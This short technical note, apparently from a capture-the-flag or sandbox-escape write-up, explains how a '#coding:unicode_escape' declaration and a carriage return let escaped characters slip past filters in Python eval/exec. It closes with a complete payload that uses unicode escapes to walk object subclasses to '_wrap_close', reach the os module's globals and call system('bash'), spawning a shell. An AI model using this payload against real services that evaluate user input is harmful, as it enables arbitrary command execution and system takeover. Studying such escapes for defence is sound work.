If a python file starts with `# coding: utf8`, it will use that encoding. `unicode_escape` is a valid encoding.
https://docs.python.org/3/library/codecs.html
https://www.python.org/dev/peps/pep-0263/

And eval/exec are files.

EBDIC encodings will not work, since the comment itself will be converted then executed if ran in `eval/exec`, but not in a normal file.

A carriage return will allow multiple lines of input in the eval, since comments must be in their own line.

```
#coding:unicode_escape\r\u000a[x for x in \u0028\u0029\u002e__class__\u002e__base__\u002e__subclasses__\u0028\u0029 if x\u002e__name__ \u003d\u003d "_wrap_close"][0]\u002eclose\u002e__globals__["system"]\u0028"bash"\u0029
```
